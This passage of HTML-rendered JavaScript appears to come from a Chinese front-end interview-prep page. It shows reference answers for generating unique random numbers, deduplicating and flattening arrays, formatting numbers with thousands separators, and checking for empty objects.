punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">.</span>length <span class=\"token operator\">===</span> n <span class=\"token operator\">?</span> arr <span class=\"token operator\">:</span> <span class=\"token function\">buildArray</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> min<span class=\"token punctuation\">,</span> max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> result <span class=\"token operator\">=</span> <span class=\"token function\">buildArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">min<span class=\"token punctuation\">,</span> max<span class=\"token punctuation\">,</span> <span class=\"token constant\">N</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> l <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token constant\">N</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> l <span class=\"token operator\">&lt;</span> <span class=\"token constant\">N</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// console.log(l);</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>max <span class=\"token operator\">-</span> min<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> min<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      arr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      l<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路\"><a href=\"#实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路\" class=\"headerlink\" title=\"实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路\"></a>实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</h4><p><strong>参考答案</strong>：</p>\n<p><strong>1.遍历数组法</strong></p>\n<p>它是最简单的数组去重方法（indexOf方法）</p>\n<p>实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> arr<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">unique1</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> hash<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2.数组下标判断法</strong></p>\n<p>调用indexOf方法，性能和方法1差不多</p>\n<p>实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">unique2</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> hash<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>3.排序后相邻去除法</strong></p>\n<p>实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">unique3</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  arr<span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> hash<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span>hash<span class=\"token punctuation\">[</span>hash<span class=\"token punctuation\">.</span>length<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>4.优化遍历数组法（推荐）</strong></p>\n<p>实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length</p>\n<p>将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">unique4</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> hash<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> j <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">===</span>arr<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token operator\">++</span>i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n      hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>5.ES6实现</strong></p>\n<p>基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。</p>\n<p>Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">unique5</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>扩展：如果重复，则去掉该元素</p>\n<p>数组下标去重</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">unique22</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> hash<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"传入-1-2-3-4-5-，返回-1-2-3-4-5\"><a href=\"#传入-1-2-3-4-5-，返回-1-2-3-4-5\" class=\"headerlink\" title=\"传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]\"></a>传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> list <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> ans <span class=\"token operator\">=</span> list<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// console.log(i)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">typeof</span> i <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span> <span class=\"token operator\">?</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> i<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// console.log(ans)</span>\n  <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">change</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​       </p>\n<p>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [1, 2, [3, 4]]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 方法4</span>\n<span class=\"token keyword\">var</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">flatten</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">some</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span> <span class=\"token operator\">=></span> Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">flatten</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"用正则和非正则实现12345678-12-x3D-》12，345，678-12\"><a href=\"#用正则和非正则实现12345678-12-x3D-》12，345，678-12\" class=\"headerlink\" title=\"用正则和非正则实现12345678.12&#x3D;》12，345，678.12\"></a>用正则和非正则实现12345678.12&#x3D;》12，345，678.12</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> num <span class=\"token operator\">=</span> <span class=\"token number\">12345678.12</span>\n<span class=\"token comment\">//12,345,678.12</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">number</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> number<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">//console.log(s)</span>\n    <span class=\"token keyword\">let</span> <span class=\"token constant\">L</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">let</span> num_s\n    <span class=\"token constant\">L</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> num_s <span class=\"token operator\">=</span> <span class=\"token constant\">L</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> num_s <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n    <span class=\"token keyword\">let</span> <span class=\"token constant\">N</span><span class=\"token operator\">=</span><span class=\"token constant\">L</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">let</span> num_f\n    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span><span class=\"token constant\">N</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">%</span> <span class=\"token number\">3</span>\n    num_f <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> y<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token constant\">N</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        num_f <span class=\"token operator\">+=</span> <span class=\"token string\">','</span> <span class=\"token operator\">+</span> <span class=\"token constant\">N</span><span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>i<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>num_s <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        num_f <span class=\"token operator\">+=</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> num_s\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> num_f\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">change</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//12,345,678.12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"写一个判断是否是空对象的函数\"><a href=\"#写一个判断是否是空对象的函数\" class=\"headerlink\" title=\"写一个判断是否是空对象的函数\"></a>写一个判断是否是空对象的函数</h4><p><strong>参考答案：</strong></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        value <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> value <span class=\"token operator\">===</span> <span class=\"token keyword\">undefined</span> <span class=\"token operator\">||</span>\n        <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> value <span class=\"token operator\">===</span> <span class=\"token string\">'object'</span> <span class=\"token operator\">&amp;&amp;</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">keys</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">===</span> <span class=\"token number\">0</span><span 